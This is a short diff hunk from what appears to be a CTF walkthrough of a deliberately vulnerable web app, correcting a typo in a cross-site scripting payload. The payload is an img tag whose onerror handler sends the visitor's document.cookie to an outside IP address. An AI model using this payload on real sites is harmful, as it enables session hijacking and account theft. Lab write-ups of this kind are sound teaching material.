@@ -22,7 +22,7 @@ description: "Mini CTF Vulnerable Web App – - A walkthrough of the challenge w
 
 - Use payload:
 ```bash
-<img src=x onerror="location.href='http ://10.102.120.158:8001/?c='+ document.cookie">
+<img src=x onerror="location.href='http://10.102.120.158:8001/?c='+ document.cookie">
 
 ```
 
